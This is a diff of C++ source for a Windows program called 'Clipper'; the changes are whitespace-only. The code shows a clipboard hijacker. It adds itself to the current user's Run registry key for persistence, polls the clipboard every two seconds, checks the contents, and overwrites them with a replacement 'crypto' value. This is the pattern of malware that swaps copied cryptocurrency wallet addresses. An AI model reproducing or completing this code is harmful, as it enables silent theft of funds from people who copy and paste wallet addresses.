@@ -28,16 +28,9 @@ void main()
 		MessageBoxW(NULL, L"The program is already running", L"Error", MB_SYSTEMMODAL | MB_ICONERROR);
 		CloseHandle(hijeck);
 	}
-
-	
 	autoranner();
 	Reactor();
 	Readbuffer();
-	
-
-
-
-
 }
 
 void checkers(string& data)
@@ -61,25 +54,19 @@ void checkers(string& data)
 			Writebuffer(crypto);
 		}
 	}
-
 }
 
 void autoranner()
 {
-
-
 	_TCHAR pathname[256] = _T("C:\\Users\\murza\\source\\repos\\Clipper\\x64\\Debug\\Clipper.exe");
 	HKEY hg;
 	RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hg);
 	RegSetValueEx(hg, L"Clipper.exe", NULL, REG_SZ, (BYTE*)pathname, sizeof(pathname));
 	RegCloseKey(hg);
-
-
 }
 
 void Reactor()
 {
-
 	while (true)
 	{
 		if (OpenClipboard(NULL))
@@ -91,10 +78,9 @@ void Reactor()
 			}
 		}
 		Sleep(2000);
-
 	}
-
 }
+
 string Readbuffer()
 {
 	if (OpenClipboard(NULL))
@@ -111,15 +97,12 @@ string Readbuffer()
 		return data;
 
 	}
-
 }
 
 void Writebuffer(string& crypto)
 {
-
 	if (OpenClipboard(NULL))
 	{
-
 		HGLOBAL buffer;
 		char* chBuffer;
 		EmptyClipboard();
@@ -131,8 +114,5 @@ void Writebuffer(string& crypto)
 		CloseClipboard();
 		Sleep(2000);
 		Reactor();
-
 	}
-
-
 }
